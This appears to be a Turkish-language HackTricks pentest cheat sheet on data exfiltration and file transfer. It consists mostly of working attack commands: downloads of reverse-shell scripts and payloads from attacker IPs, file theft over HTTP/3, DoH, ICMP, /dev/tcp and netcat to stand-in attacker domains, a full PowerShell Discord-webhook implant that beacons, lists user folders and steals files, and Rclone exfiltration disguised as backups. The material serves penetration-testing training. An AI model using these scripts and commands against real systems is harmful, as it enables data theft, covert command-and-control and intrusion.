# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> `C:\Users\Public` içinde loot'u hazırlama ve meşru yedeklemeleri taklit etmek için Rclone ile exfiltration yapmaya yönelik uçtan uca bir örnek için aşağıdaki iş akışını inceleyin.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Bilgi exfiltration'ı için sıkça whitelisted edilen domain'ler

Kötüye kullanılabilecek, sıkça whitelisted edilen domain'leri bulmak için [https://lots-project.com/](https://lots-project.com/) adresine göz atın.

## Kopyala\&Yapıştır Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Dosyaları yükleme

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python modülü [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS Sunucusu**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Egress kontrolleri klasik **TCP/443** denetimi için ayarlanmış ancak **UDP/443** konusunda esnekse, **HTTP/3**'ü zorlamak aktarımı TLS-over-TCP yerine **QUIC** üzerinden gerçekleştirebilir. Saldırgan uç noktasının yerel HTTP/3 desteğine ihtiyacı vardır (örneğin, `Alt-Svc: h3` duyurusu yapan bir reverse proxy veya upload endpoint).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

2025 tarihli bir araştırma makalesi (QUIC-Exfil), QUIC'in şifrelenmiş başlıklarının ve dinamik adres değişikliklerinin, exfiltration'ın güvenlik duvarı düzeyinde tespitini TLS veya DNS tabanlı kanallara kıyasla zorlaştırabileceğini ortaya koydu ve exfiltration'ı sunucu tarafında bağlantı geçişi gibi gösteren, sunucunun tercih ettiği adres yöntemini gösterdi.<sup>[[9]](#references)</sup>

### Önceden imzalanmış / devredilmiş nesne depolama yüklemeleri

Kısa ömürlü bir **signed URL** oluşturabildiğinizde veya edinebildiğinizde, kurbanın yalnızca standart bir HTTPS istemcisine ihtiyacı olur. Böylece ana makineye cloud SDK'ları veya uzun ömürlü kimlik bilgileri yüklemek gerekmez.<sup>[[8]](#references)</sup> Bu yöntem, yaygın nesne depolama trafiğine de karışabilir.

**Linux / macOS (AWS S3 önceden imzalanmış `PUT`)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 için ön imzalı `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notlar:
- Pre-signed URL'ler / SAS token'ları genellikle **path**, **HTTP method** ve **expiration** kapsamını sınırlar.<sup>[[8]](#references)[[10]](#references)</sup>
- Azure Blob `Put Blob` için `x-ms-blob-type: BlockBlob` zorunludur.<sup>[[10]](#references)</sup>
- Bu yöntem `curl`, `Invoke-WebRequest` veya ham HTTPS `PUT` isteği gönderebilen özel bir implant ile iyi çalışır.

### goshs

[goshs](https://github.com/patrickhener/goshs), `python3 -m http.server` için tek binary'den oluşan bir alternatiftir.<sup>[[4]](#references)</sup>
Upload, download, WebDAV, SFTP, SMB, TLS, authentication, paylaşım bağlantıları ve OOB işbirliği özelliklerini (DNS, SMTP, NTLM hash yakalama) destekler.<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) for C2 ve Veri Sızdırma

Webhooks, JSON ve isteğe bağlı dosya parçalarını kabul eden, yalnızca yazma amaçlı HTTPS uç noktalarıdır. Genellikle güvenilir SaaS alan adlarına izin verilir ve OAuth/API anahtarları gerektirmezler; bu da onları düşük sürtünmeli beaconing ve veri sızdırma için kullanışlı kılar.<sup>[[5]](#references)[[6]](#references)</sup>

Temel fikirler:
- Uç nokta: Discord, https://discord.com/api/webhooks/<id>/<token> adresini kullanır.
- payload_json adlı bir parçada {"content":"..."} içeren multipart/form-data POST isteği gönderin; isteğe bağlı file adlı dosya parçaları ekleyin.
- Operatör döngüsü örüntüsü: düzenli beacon -> dizin keşfi -> hedefli dosya sızdırma -> keşif dökümü -> bekleme. HTTP 204 NoContent/200 OK, iletimin başarılı olduğunu doğrular.

PowerShell PoC (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Notlar:
- Benzer kalıplar, gelen webhook'larını kullanan diğer iş birliği platformları (Slack/Teams) için de geçerlidir; URL'yi ve JSON şemasını buna göre ayarlayın.
- Discord Desktop cache artifact'larının DFIR incelemesi ve webhook/API kurtarma için aşağıdaki ilgili sayfaya bakın.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (bulut/nesne depolama üzerinden veri sızdırma)

Modern operatörler genellikle **loot'u yerelde stage eder**, ardından aktarımı normal bir yedekleme veya senkronizasyon işi gibi göstermek için [Rclone](https://rclone.org/) kullanır. Uygulanabilir bir kalıp şöyledir:

1. Normal bir remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. **İçeriklerin ve dosya adlarının istemci tarafında şifrelenmesi** için bir `crypt` wrapper
3. Sağlayıcı nesne boyutu sınırları uyguluyorsa veya daha küçük yükleme birimleri istiyorsanız isteğe bağlı bir `chunker` wrapper

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Notlar:
- `crypt` hem dosya içeriklerini hem de adlarını şifreleyebilir.<sup>[[3]](#references)</sup>
- `chunker` büyük dosyaları şeffaf biçimde parçalara ayırır ve indirme sırasında yeniden birleştirir.<sup>[[11]](#references)</sup>
- `rclone.conf`, `crypt` sırlarını **obscured** biçimde saklar; bu, güçlü bir bekleme hâlinde koruma sağlamaz.<sup>[[3]](#references)</sup> Kısa süreli işlemler için özel bir geçici yapılandırma kullanıp sonrasında silmeyi tercih edin. Daha uzun süre saklamanız gerekiyorsa, diskte düz bir `rclone.conf` bırakmak yerine şifrelenmiş yapılandırma yönetimini (`RCLONE_CONFIG_PASS` / `--password-command`) tercih edin.<sup>[[11]](#references)</sup>
- Hedef zaten **OneDrive**, **Google Drive** veya **Dropbox** ile eşitleniyorsa, loot'u eşitlenen dizine kopyalamak yeni bir aktarım binary'si bırakmak yerine önceden onaylanmış bir istemciden yararlanmanızı sağlayabilir.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP sunucusu (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP sunucusu (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP sunucusu (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** istemcisi

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Sunucu olarak Kali

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Ya da **Samba kullanarak** bir SMB paylaşımı oluşturun:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs), dosyaları SMB üzerinden sunan ve bağlanan istemcilerin NTLM hash'lerini yakalayan tek binary'li bir alternatiftir.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

Saldırganın SSHd'yi çalıştırıyor olması gerekir.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Kurbanın SSH erişimi varsa, saldırgan kurbandaki bir dizini kendi makinesine mount edebilir.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Kurban makineden dosya indir

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Mağdura dosya yükleme

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

**@BinaryShadow\_**'a teşekkürler

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Klasik UDP/53 DNS trafiği gürültülüyse veya engellenmişse, ancak giden HTTPS trafiğine genel olarak izin veriliyorsa, olağan DNS-label exfiltration pattern, herkese açık bir resolver'a gönderilen **DoH** isteklerinin içine sarılabilir. Her label'ı 63 baytlık DNS sınırının çok altında tutun ve Base32 gibi DNS-safe bir alfabe kullanın.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

`exf.attacker.tld` için yetkili DNS sunucusunda, sorguları sayısal öneke göre sıralayın ve Base32 akışını yeniden oluşturun. Böylece taşıma, klasik UDP/53 DNS yerine resolver’a HTTPS üzerinden yapılır.<sup>[[2]](#references)</sup>

Tam çift yönlü DNS tunnel araçları (`iodine`, `dnscat2` vb.) için [tunneling sayfasına](tunneling-and-port-forwarding.md) bakın.

## **SMTP**

Bir SMTP sunucusuna veri gönderebiliyorsanız, verileri almak için Python ile bir SMTP sunucusu oluşturabilirsiniz:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs), OOB exfiltration senaryoları sırasında e-posta callback'lerini yakalamak için hızlıca bir SMTP server başlatabilir.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Alınan e-postalar ve callback'ler doğrudan terminal çıktısında görüntülenir.
Tam OOB kapsamı için DNS callback server ile birleştirilebilir:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

XP ve 2003'te varsayılan olarak bulunur (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)

Kali'de **TFTP sunucusunu başlat**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Python'da TFTP sunucusu:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

**kurban** Kali sunucusuna bağlanın:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

PHP oneliner kullanarak bir dosya indirin:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Kurban**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

`debug.exe` programı yalnızca binary dosyaları incelemeye değil, aynı zamanda **bunları hex'ten yeniden oluşturmaya** da olanak tanır. Bu, bir binary dosyanın hex'ini sağlayarak `debug.exe` ile binary dosyanın oluşturulabileceği anlamına gelir. Ancak debug.exe'nin **boyutu 64 kb'a kadar olan dosyaları derleme** sınırlaması olduğunu unutmamak önemlidir.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Ardından metni Windows shell'e kopyalayıp yapıştırın; nc.exe adlı bir dosya oluşturulacaktır.

## References

- [1] [Windows'a dosya aktarma](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` arka ucu](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord'u C2 olarak kullanma ve geride kalan önbelleğe alınmış kanıtlar](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Webhook'u yürütme](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Adli İnceleme Paketi (önbellek ayrıştırıcısı)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Önceden imzalanmış URL'lerle nesne yükleme - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Veri sızdırma saldırıları gerçekleştirmek için QUIC'in Server Preferred Address özelliğinden yararlanma](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone belgeleri](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
